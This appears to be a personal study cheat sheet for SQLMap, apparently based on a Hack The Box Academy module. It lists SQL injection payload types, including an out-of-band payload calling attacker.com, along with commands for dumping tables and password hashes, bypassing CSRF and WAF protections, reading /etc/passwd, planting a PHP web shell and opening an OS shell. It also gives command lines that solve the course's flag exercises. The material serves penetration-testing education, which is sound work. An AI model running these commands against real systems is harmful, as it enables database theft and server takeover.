
To use SQLMap we can use : `python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'`
To install SQLMap : 
``` shell
# For Linux
sudo apt install sqlmap

#For Windows
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
```

## Types of SQLi
- **Boolean-based Blind SQL Injection** : `AND 1=1`
- **Error-based SQL Injection** : `AND GTIF_SUBSET(@@version,0)`
- **Union query based** : `UNION ALL SELECT 1,@@version,3`
- **Stacked Queries** : `; DROPE TABLE users`
- **Time-based Blind SQL Injection** : `AND 1=IF(2>1,SLEEP(5),0)`
- **Inline Queries** : `SELECT(SELECT @@version) from`
- **Out-of-band SQL Injection** : `LOAD_FILE(CONCAT('\\\',@@version,'.attacker.com\\README.txxt'))`

## Levels of Help Message Listing
- Basic Listing : `sqlmap -h`
- Advanced Listing: `sqlmap --hh`

Command used to run SQLMap : `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`

> Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.

## cURL Commands
One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools: ![Network panel showing a GET request to www.example.com with a 404 status, and a context menu with options like 'Copy as cURL'.](https://academy.hackthebox.com/storage/modules/58/M5UVR6n.png)

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command:

Running SQLMap on an HTTP Request

```shell-session
ShibuShivansh@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`).

## GET/POST Requests
For GET Request, we need to run the command : `sqlmap --url "https://domain.com"`

For POST Request, we need to run the command : `sqlmap 'http://www.example.com/' --data 'uid=1&name=test`
> Now here both the parameters `uid` and `name` will be tested, but if we need one of them to be tested then it should be like `uid1*&name=test`, so here UID must be tested.

## Full HTTP Request
Create a file named as `req.txt` and insert the HTTP Request Packet there. And then use the command : `sqlmap -r req.txt`

## Specifying a Cookie 
- Using a flag `--cookie`  : `sqlmap "http://www.example.com/" --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
- Using a flag `-H/--header` : `sqlmap "http://www.example.com/" -H='Cookie:ab4530f4a7d10448457fa8b0eadac29c'`

**Specifying alternative HTTP Method :** `sqlmap -u www.target.com --data='id=1' --method PUT`


We should also use two flags to extract information : `--batch --dump`

`sqlmap -r Case3.txt -p cookie --threads 10 --dump -T flag3 --batch`: In this command , `-p` specifies parameter to be tested, `--dump -T flag2` instructs SQLmap to dump (extract) all data from the table named flag2.

To store the traffic, we can use this command : `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`

To raise the verbosity of the scan, we can use the command : `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`

To use proxy as Burp we use the command : `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch --proxy 127.0.0.1:8080`

## Prefix/Suffix

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.  
For such runs, options `--prefix` and `--suffix` can be used as follows:

Code: bash

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```


## Level/Risk
- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
    
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

#### Status Codes

For example, when dealing with a huge target response with a lot of dynamic content, subtle differences between `TRUE` and `FALSE` responses could be used for detection purposes. If the difference between `TRUE` and `FALSE` responses can be seen in the HTTP codes (e.g. `200` for `TRUE` and `500` for `FALSE`), the option `--code` could be used to fixate the detection of `TRUE` responses to a specific HTTP code (e.g. `--code=200`).

#### Titles

If the difference between responses can be seen by inspecting the HTTP page titles, the switch `--titles` could be used to instruct the detection mechanism to base the comparison based on the content of the HTML tag `<title>`.

#### Strings

In case of a specific string value appearing in `TRUE` responses (e.g. `success`), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).

#### Text-only

When dealing with a lot of hidden content, such as certain HTML page behaviors tags (e.g. `<script>`, `<style>`, `<meta>`, etc.), we can use the `--text-only` switch, which removes all the HTML tags, and bases the comparison only on the textual (i.e., visible) content.

#### Techniques

In some special cases, we have to narrow down the used payloads only to a certain type. For example, if the time-based blind payloads are causing trouble in the form of response timeouts, or if we want to force the usage of a specific SQLi payload type, the option `--technique` can specify the SQLi technique to be used.

For example, if we want to skip the time-based blind and stacking SQLi payloads and only test for the boolean-based blind, error-based, and UNION-query payloads, we can specify these techniques with `--technique=BEU`.

#### UNION SQLi Tuning

In some cases, `UNION` SQLi payloads require extra user-provided information to work. If we can manually find the exact number of columns of the vulnerable SQL query, we can provide this number to SQLMap with the option `--union-cols` (e.g. `--union-cols=17`). In case that the default "dummy" filling values used by SQLMap -`NULL` and random integer- are not compatible with values from results of the vulnerable SQL query, we can specify an alternative value instead (e.g. `--union-char='a'`).

Furthermore, in case there is a requirement to use an appendix at the end of a `UNION` query in the form of the `FROM <table>` (e.g., in case of Oracle), we can set it with the option `--union-from` (e.g. `--union-from=users`).  
Failing to use the proper `FROM` appendix automatically could be due to the inability to detect the DBMS name before its usage.

Commands as per Risk and Levels : 
1. `sqlmap -r Case2.txt --threads 10 --dump -T flag2 --batch`
2. `sqlmap -r Case3.txt -p cookie --threads 10 --dump -T flag3 --batch`
3. `sqlmap -r Case4.txt --threads 10 --dump -T flag4 --batch`
4. `sqlmap -r Case5.txt --batch --dump -T flag5 -D testdb --no-cast --dbms=MySQL --technique=T --time-sec=10 --level=5 --risk=3 --fresh-queries`
5. `sqlmap -r Case6.txt --batch --dump -T flag6 -D testdb --no-cast --level=5 --risk=3 --prefix='`)'`
6. `sqlmap -r Case7.txt --batch --dump -T flag7 -D testdb --no-cast --level=5 --risk=3 --union-cols=5 --dbms=MySQL`
7. `sqlmap -r Case1.txt --threads 10 --dump -T flag1 -D testdb -dbms=MySQL --batch`
8. `sqlmap -r Case1.txt --threads 10 --search -C style --batch`
9. `sqlmap -r Case1.txt --threads 10 --dump -D testdb -T users --batch`
10. `sqlmap -r Case8.txt --csrf-token=t0ken -T flag8 --dump --risk=3 --level=5 --batch`
11. `sqlmap -r Case9.txt -T flag9 --dump --risk=3 --level=5 --batch --randomize=uid`
12. `sqlmap -r Case10.txt -T flag10 --dump --risk=3 --level=5 --batch`
13. `sqlmap -r Case11.txt -T flag11 --dump --risk=3 --level=5 --batch --tamper=greatest,least --threads=10`
14. `sqlmap -r OsExploit.txt --file-read "/var/www/html/flag.txt" --batch --threads 10`
15. `sqlmap -r OsExploit.txt --os-shell --threads 10 --batch`
16. `sqlmap -r Add-To-Cart.txt --threads 10 --tamper=between -T final_flag --dump --batch`

## Database Enumeration
If a user wants to retrieve the "banner" (switch `--banner`) for the target based on MySQL DBMS, the `VERSION()` query will be used for such purpose.  

In case of retrieval of the current user name (switch `--current-user`), the `CURRENT_USER()` query will be used.

Enumeration usually starts with the retrieval of the basic information:

- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)

```shell-session
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

This command will show us the results as DB Version, Current User, Current Database and if the User if the DBA or not.

```shell-session
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```
 This command results in providing us the table names present in the given database.

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

This `--dump` flag is used to retrieve the contents of the table provided.

```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

`-C` is used to retrieve the results of these column names.

## Full DB Enumeration

Instead of retrieving content per single-table basis, we can retrieve all tables inside the database of interest by skipping the usage of option `-T` altogether (e.g. `--dump -D testdb`). By simply using the switch `--dump` without specifying a table with `-T`, all of the current database content will be retrieved. As for the `--dump-all` switch, all the content from all the databases will be retrieved.

In such cases, a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.

## DB Schema Enumeration
Finding DB Schema : `sqlmap -u "http://www.example.com/?id=1" --schema`

## Searching for Data
When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:


`sqlmap -u "http://www.example.com/?id=1" --search -T user`

## DB Users Password Enumeration & Cracking
`sqlmap -u "http://www.example.com/?id=1" --passwords --batch` : `--password` flag is used to dump the content table with database-specific credentials.

## CSRF
```shell-session
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

## Unique Value Bypass
```shell-session
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

## Calculated Value Bypass
```shell-session
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```


## OS Exploitation
Command to read file : `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`

Checking for DBA Privileges : `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`

Reading Local Files :`sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"

Create a PHP Payload and then use this command to write that payload or Backdoor into the Server : `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`
To execute command, we can use the command : `curl http://www.example.com/shell.php?cmd=ls+-la`

To get OS Command Shell : `sqlmap -u "http://www.example.com/?id=1" --os-shell`

Error based SQL Injection : `sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E`

